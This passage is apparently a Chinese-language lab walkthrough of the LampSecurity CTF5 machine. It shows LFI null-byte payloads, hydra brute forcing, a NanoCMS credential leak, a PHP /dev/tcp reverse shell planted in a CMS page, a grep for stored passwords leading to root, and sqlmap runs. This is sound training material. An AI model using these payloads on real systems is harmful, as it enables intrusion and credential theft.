class="hljs-string">+ 1 host(s) tested</span><br></code></pre></td></tr></table></figure>

<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="RFI（F）"><a href="#RFI（F）" class="headerlink" title="RFI（F）"></a>RFI（F）</h4><p>之前nikto中发现<code>/info.php?file=</code>可能存在远程文件包含，实际试了一下发现并不行。</p>
<h4 id="SQLi（F）"><a href="#SQLi（F）" class="headerlink" title="SQLi（F）"></a>SQLi（F）</h4><p>再看看sql注入，如果能直接拿到登录凭证那美滋滋。<br>先sqlmap扫一下<code>[http://192.168.56.139:80/events/?q=event%2Fical](http://192.168.56.139:80/events/?q=event%2Fical)</code>，发现没有注入点。<br>手动看看发现是下载一个文件。<br>再sqlmap扫一下<code>[http://192.168.56.139:80/?page=contact](http://192.168.56.139:80/?page=contact)</code>，还是没有注入点。</p>
<h4 id="LFI（F）"><a href="#LFI（F）" class="headerlink" title="LFI（F）"></a>LFI（F）</h4><p>直接访问发现报错，报错信息如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo curl <span class="hljs-string">&#x27;http://192.168.56.139/?page=../../../../../../../etc/passwd&#x27;</span><br>&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;<br><br>&lt;b&gt;Warning&lt;/b&gt;:  include_once(inc/../../../../../../../etc/passwd.php) [&lt;a href=<span class="hljs-string">&#x27;function.include-once&#x27;</span>&gt;function.include-once&lt;/a&gt;]: failed to open stream: No such file or directory <span class="hljs-keyword">in</span> &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;<br><br><br><br>&lt;b&gt;Warning&lt;/b&gt;:  include_once() [&lt;a href=<span class="hljs-string">&#x27;function.include&#x27;</span>&gt;function.include&lt;/a&gt;]: Failed opening <span class="hljs-string">&#x27;inc/../../../../../../../etc/passwd.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/share/pear:/usr/share/php&#x27;</span>) <span class="hljs-keyword">in</span> &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;<br><br>&lt;/div&gt;<br></code></pre></td></tr></table></figure>
<p>一眼文件包含漏洞，由于后面有<code>.php</code>，我们之前看phpinfo页面发现此PHP版本存在0字符截断漏洞。直接截断。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># http://192.168.56.139/?page=../../../../../../../etc/passwd%00</span><br><br>root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin <span class="hljs-built_in">sync</span>:x:5:0:<span class="hljs-built_in">sync</span>:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash<br></code></pre></td></tr></table></figure>
<p>可看到<code>/etc/passwd</code>内容，可惜看不到shadow的内容，想看看配置信息啥的无果。先暂时搁置这个漏洞。</p>
<h4 id="Samba（F）"><a href="#Samba（F）" class="headerlink" title="Samba（F）"></a>Samba（F）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]<br>└─$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.139<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 16:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.00053s latency).<br><br>PORT    STATE SERVICE<br>445/tcp open  microsoft-ds<br>MAC Address: 00:0C:29:7D:00:15 (VMware)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: &lt;blank&gt;<br>|   \\192.168.56.139\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (Samba Server Version 3.0.26a-6.fc8)<br>|     Users: 1<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|_    Anonymous access: READ/WRITE<br>| smb-enum-users: <br>|   LOCALHOST\amy (RID: 2008)<br>|     Full name:   Amy Pendelton<br>|     Flags:       Normal user account<br>|   LOCALHOST\andy (RID: 2004)<br>|     Full name:   Andrew Carp<br>|     Flags:       Normal user account<br>|   LOCALHOST\jennifer (RID: 2002)<br>|     Full name:   Jennifer Sea<br>|     Flags:       Normal user account<br>|   LOCALHOST\loren (RID: 2006)<br>|     Full name:   Loren Felt<br>|     Flags:       Normal user account<br>|   LOCALHOST\patrick (RID: 2000)<br>|     Full name:   Patrick Fair<br>|_    Flags:       Normal user account<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 4.12 seconds<br></code></pre></td></tr></table></figure>
<p>看看我们的samba服务吧，扫出了各用户名以及共享的地址<br>再用smbmap扫一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]<br>└─$ smbmap -H 192.168.56.139                 <br>[+] IP: 192.168.56.139:445      Name: unknown                                           <br>Disk        Permissions     Comment<br>----        -----------     -------<br>homes       NO ACCESS       Home Directories<br>IPC$        NO ACCESS       IPC Service (Samba Server Version 3.0.26a-6.fc8)<br></code></pre></td></tr></table></figure>
<p>得，都是NO ACCESS。寄</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Not use</span><br>hydra -l andy -P /usr/share/wordlists/rockyou.txt 192.168.56.139 http-post-form <span class="hljs-string">&quot;/~andy/data/nanoadmin.php:SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1</span><br><span class="hljs-string">;user=^USER^&amp;pass=^PASS^:F=wrong Username or Password&quot;</span><br><br><br>Cookie: SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1<br>Upgrade-Insecure-Requests: 1<br>user=1111&amp;pass=2222<br></code></pre></td></tr></table></figure>

<h4 id="NanoCMS（S）"><a href="#NanoCMS（S）" class="headerlink" title="NanoCMS（S）"></a>NanoCMS（S）</h4><p>在后台登录界面，我们可以发现cms是nanocms，在exp-db上查一下，发现只有一个已登录用户的RCE漏洞。<br>再在搜索引擎查一查<code>search in bing: nanocms exploit</code>，发现nanoCMS存在一个数据泄露漏洞。<br class='item-img' data-src='/pic/assets/1682583289658-c18c9cb0-6b33-48e5-9777-b7b302bd939c.png'><img src="/pic/assets/1682583289658-c18c9cb0-6b33-48e5-9777-b7b302bd939c.png" alt="query-nano-exp.png"><br>虽然不知道nanocms的版本，但是还是试试吧，死马当活马医。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]<br>└─$ curl http://192.168.56.139/~andy/data/pagesdata.txt<br>a:12:&#123;s:8:<span class="hljs-string">&quot;homepage&quot;</span>;s:1:<span class="hljs-string">&quot;1&quot;</span>;s:10:<span class="hljs-string">&quot;links_cats&quot;</span>;a:4:&#123;s:7:<span class="hljs-string">&quot;sidebar&quot;</span>;a:2:&#123;i:0;i:1;i:1;i:4;&#125;s:11:<span class="hljs-string">&quot;other-pages&quot;</span>;a:0:&#123;&#125;s:14:<span class="hljs-string">&quot;top-navigation&quot;</span>;a:2:&#123;i:0;s:1:<span class="hljs-string">&quot;1&quot;</span>;i:1;s:1:<span class="hljs-string">&quot;4&quot;</span>;&#125;s:12:<span class="hljs-string">&quot;Footer-Right&quot;</span>;a:2:&#123;i:0;s:1:<span class="hljs-string">&quot;1&quot;</span>;i:1;s:1:<span class="hljs-string">&quot;4&quot;</span>;&#125;&#125;s:5:<span class="hljs-string">&quot;slugs&quot;</span>;a:2:&#123;i:1;s:4:<span class="hljs-string">&quot;home&quot;</span>;i:4;s:7:<span class="hljs-string">&quot;contact&quot;</span>;&#125;s:6:<span class="hljs-string">&quot;titles&quot;</span>;a:2:&#123;i:1;s:4:<span class="hljs-string">&quot;Home&quot;</span>;i:4;s:7:<span class="hljs-string">&quot;Contact&quot;</span>;&#125;s:10:<span class="hljs-string">&quot;slug_count&quot;</span>;i:12;s:8:<span class="hljs-string">&quot;settings&quot;</span>;a:3:&#123;s:19:<span class="hljs-string">&quot;index-last-modified&quot;</span>;i:1234513760;s:18:<span class="hljs-string">&quot;def-template-areas&quot;</span>;a:4:&#123;i:0;s:12:<span class="hljs-string">&quot;website name&quot;</span>;i:2;s:14:<span class="hljs-string">&quot;website slogan&quot;</span>;i:3;s:16:<span class="hljs-string">&quot;below navigation&quot;</span>;i:4;s:16:<span class="hljs-string">&quot;copyright notice&quot;</span>;&#125;s:18:<span class="hljs-string">&quot;def-template-links&quot;</span>;a:2:&#123;i:0;s:14:<span class="hljs-string">&quot;top-navigation&quot;</span>;i:1;s:12:<span class="hljs-string">&quot;Footer-Right&quot;</span>;&#125;&#125;s:13:<span class="hljs-string">&quot;active-tweaks&quot;</span>;a:2:&#123;i:0;s:7:<span class="hljs-string">&quot;deutsch&quot;</span>;i:1;s:19:<span class="hljs-string">&quot;language-pack-tweak&quot;</span>;&#125;s:11:<span class="hljs-string">&quot;lang-select&quot;</span>;s:7:<span class="hljs-string">&quot;english&quot;</span>;s:6:<span class="hljs-string">&quot;seourl&quot;</span>;s:1:<span class="hljs-string">&quot;0&quot;</span>;s:8:<span class="hljs-string">&quot;username&quot;</span>;s:5:<span class="hljs-string">&quot;admin&quot;</span>;s:8:<span class="hljs-string">&quot;password&quot;</span>;s:32:<span class="hljs-string">&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;</span>;s:7:<span class="hljs-string">&quot;version&quot;</span>;s:4:<span class="hljs-string">&quot;v_4f&quot;</span>;&#125;   <br></code></pre></td></tr></table></figure>
<p>发现竟然爆出了username和password。<br>直接把md5值的密码丢去破解。<br class='item-img' data-src='/pic/assets/1682583540033-065a0a22-68c7-42c3-bba1-77e26f8ef25a.png'><img src="/pic/assets/1682583540033-065a0a22-68c7-42c3-bba1-77e26f8ef25a.png" alt="md5pass-crack.png"><br>OK<br>登录后台<br class='item-img' data-src='/pic/assets/1682583559790-b3168777-a196-4145-b32e-8e66ac816743.png'><img src="/pic/assets/1682583559790-b3168777-a196-4145-b32e-8e66ac816743.png" alt="nano-admin-panel.png"><br>OK<br>四处找了找，发现可以编辑页面的地方，决定隐蔽点在contact页面插个反弹shell。<br class='item-img' data-src='/pic/assets/1682583574629-d7e63399-71cd-47c6-b8b1-e264bc15db61.png'><img src="/pic/assets/1682583574629-d7e63399-71cd-47c6-b8b1-e264bc15db61.png" alt="webshell-insert.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.132/8080 0&gt;&amp;1&#x27;&quot;</span>) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>成功获取shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]<br>└─$ sudo nc -lvp 443 <br>listening on [any] 443 ...<br>192.168.56.139: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.132] from (UNKNOWN) [192.168.56.139] 54757<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash-3.2$ <span class="hljs-built_in">whoami</span><br>apache<br>bash-3.2$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe7d:15/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>bash-3.2$<br></code></pre></td></tr></table></figure>
<h2 id="Priv-E"><a href="#Priv-E" class="headerlink" title="Priv E"></a>Priv E</h2><p><code>sudo -l</code> need password.</p>
<p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code><br>没有有价值的，at用了总是失败，其他没有啥能用的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-3.2$ <span class="hljs-built_in">cat</span> /etc/crontab<br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br>HOME=/<br><br><span class="hljs-comment"># run-parts</span><br>01 * * * * root run-parts /etc/cron.hourly<br>02 4 * * * root run-parts /etc/cron.daily<br>22 4 * * 0 root run-parts /etc/cron.weekly<br>42 4 1 * * root run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure>
<p>一个个去定时任务文件夹里看了一遍，研究了下&#x2F;etc&#x2F;cron.daily里的一个定时任务，没发现可以利用的东西。</p>
<p>传一下lse.sh上去，执行后发现这个shell不支持颜色显示语法，可读性极差。。。<br>换成linpeas，发现可以正常显示颜色。还得是他。<br>可惜还是没有提供特别有用的信息，虽然此系统版本很低，很有可能可以内核提权，但是，太不稳定了，还是不试了。</p>
<p>看了下视频思路：</p>
<blockquote>
<p>There <strong>so many</strong> user in the system that maybe some of them would left credentials in their files. So why not take a try?<br>多用户环境下，保不齐会有带路党，反正试试不吃亏。</p>
</blockquote>
<p>所以我们递归忽略大小写搜一下<code>/home</code>下的文件里的pass字段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -R recursion -i ignore Cap</span><br>grep -R -i pass /home/* 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/andy/public_html/data/admin-design/loginform.php:    &lt;<span class="hljs-built_in">tr</span>&gt;&lt;td&gt;&lt;?php _lt(<span class="hljs-string">&#x27;Password&#x27;</span>); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;password&#x27;</span> name=<span class="hljs-string">&#x27;pass&#x27;</span>&gt;&lt;/td&gt;&lt;/tr&gt;<br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;title&gt;Root password&lt;/title&gt;<br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &lt;text xml:space=<span class="hljs-string">&quot;preserve&quot;</span>&gt;&lt;note-content version=<span class="hljs-string">&quot;0.1&quot;</span>&gt;Root password<br>/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password<br>/home/patrick/.tomboy.log:12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password<br>/home/patrick/.tomboy.log:12/5/2012 7:24:56 AM [DEBUG]: Saving <span class="hljs-string">&#x27;Root password&#x27;</span>...<br>/home/patrick/.tomboy.log:12/5/2012 7:25:03 AM [DEBUG]: Saving <span class="hljs-string">&#x27;Root password&#x27;</span>...<br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"># cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;0.2&quot;</span> <span class="hljs-attr">xmlns:link</span>=<span class="hljs-string">&quot;http://beatniksoftware.com/tomboy/link&quot;</span> <span class="hljs-attr">xmlns:size</span>=<span class="hljs-string">&quot;http://beatniksoftware.com/tomboy/size&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://beatniksoftware.com/tomboy&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Root password<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">&quot;preserve&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note-content</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;0.1&quot;</span>&gt;</span>Root password<br><br>Root password<br><br>50$cent<span class="hljs-tag">&lt;/<span class="hljs-name">note-content</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">last-change-date</span>&gt;</span>2012-12-05T07:24:52.7364970-05:00<span class="hljs-tag">&lt;/<span class="hljs-name">last-change-date</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">create-date</span>&gt;</span>2012-12-05T07:24:34.3731780-05:00<span class="hljs-tag">&lt;/<span class="hljs-name">create-date</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">cursor-position</span>&gt;</span>15<span class="hljs-tag">&lt;/<span class="hljs-name">cursor-position</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">width</span>&gt;</span>450<span class="hljs-tag">&lt;/<span class="hljs-name">width</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">height</span>&gt;</span>360<span class="hljs-tag">&lt;/<span class="hljs-name">height</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">y</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">y</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">open-on-startup</span>&gt;</span>False<span class="hljs-tag">&lt;/<span class="hljs-name">open-on-startup</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>密码发现，存的还是root密码，离谱。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">ash-3.2$ su<br>su<br>Password: 50<span class="hljs-variable">$cent</span><br><br>[root@localhost bin]<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>[root@localhost bin]<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe7d:15/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>[root@localhost bin]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>搞定。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>实际上测试SQLi的时候还是不够细，光想着url里的参数了。老惦记那B<code>GET</code>方法干吗。真得想想<code>POST</code>的事吧。<br>在<code>192.168.56.139/list/</code>页面中，4个form输入框存在SQLi漏洞，加个<code>&#39;</code>试出来了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]<br>└─$ sudo sqlmap -u http://192.168.56.139/list/ --data <span class="hljs-string">&#x27;name=1&amp;email=&amp;phone=&amp;org=&#x27;</span> <br>        ___<br>       __H__                                                                                    <br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.7.2#stable&#125;                                                        </span><br><span class="hljs-string">|_ -| . [&quot;</span>]     | .<span class="hljs-string">&#x27;| . |                                                                       </span><br><span class="hljs-string">|___|_  [)]_|_|_|__,|  _|                                                                       </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                    </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 15:16:57 /2023-04-27/<br><br>[15:16:57] [WARNING] provided value <span class="hljs-keyword">for</span> parameter <span class="hljs-string">&#x27;email&#x27;</span> is empty. Please, always use only valid parameter values so sqlmap could be able to run properly<br>[15:16:57] [WARNING] provided value <span class="hljs-keyword">for</span> parameter <span class="hljs-string">&#x27;phone&#x27;</span> is empty. Please, always use 